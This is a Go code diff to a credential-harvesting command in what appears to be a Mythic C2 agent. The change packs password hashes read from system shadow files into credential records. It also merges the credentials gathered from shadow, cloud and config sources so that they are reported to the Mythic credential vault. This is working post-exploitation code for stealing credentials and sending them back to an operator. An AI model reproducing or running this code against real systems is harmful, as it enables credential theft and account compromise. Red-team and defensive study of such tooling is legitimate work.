@@ -31,6 +31,7 @@ func credHarvestDispatch(args credHarvestArgs) structs.CommandResult {
 
 func credShadow(args credHarvestArgs) structs.CommandResult {
 	var sb strings.Builder
+	var creds []structs.MythicCredential
 
 	sb.WriteString("System Credential Files\n")
 	sb.WriteString(strings.Repeat("=", 60) + "\n\n")
@@ -62,6 +63,15 @@ func credShadow(args credHarvestArgs) structs.CommandResult {
 
 			sb.WriteString(fmt.Sprintf("  %s:%s\n", user, hash))
 			count++
+
+			// Report hash to Mythic credential vault
+			creds = append(creds, structs.MythicCredential{
+				CredentialType: "hash",
+				Realm:          "",
+				Account:        user,
+				Credential:     hash,
+				Comment:        "cred-harvest shadow",
+			})
 		}
 		if count == 0 {
 			sb.WriteString("  (no password hashes found — accounts may be locked)\n")
@@ -121,32 +131,50 @@ func credShadow(args credHarvestArgs) structs.CommandResult {
 		sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
 	}
 
-	return structs.CommandResult{
+	result := structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
 		Completed: true,
 	}
+	if len(creds) > 0 {
+		result.Credentials = &creds
+	}
+	return result
 }
 
 func credAll(args credHarvestArgs) structs.CommandResult {
 	var sb strings.Builder
+	var allCreds []structs.MythicCredential
 
 	shadow := credShadow(args)
 	sb.WriteString(shadow.Output)
 	sb.WriteString("\n")
+	if shadow.Credentials != nil {
+		allCreds = append(allCreds, *shadow.Credentials...)
+	}
 
 	cloud := credCloud(args)
 	sb.WriteString(cloud.Output)
 	sb.WriteString("\n")
+	if cloud.Credentials != nil {
+		allCreds = append(allCreds, *cloud.Credentials...)
+	}
 
 	configs := credConfigs(args)
 	sb.WriteString(configs.Output)
+	if configs.Credentials != nil {
+		allCreds = append(allCreds, *configs.Credentials...)
+	}
 
-	return structs.CommandResult{
+	result := structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
 		Completed: true,
 	}
+	if len(allCreds) > 0 {
+		result.Credentials = &allCreds
+	}
+	return result
 }
 
 // getUserHomes returns home directories from /etc/passwd, optionally filtered by user
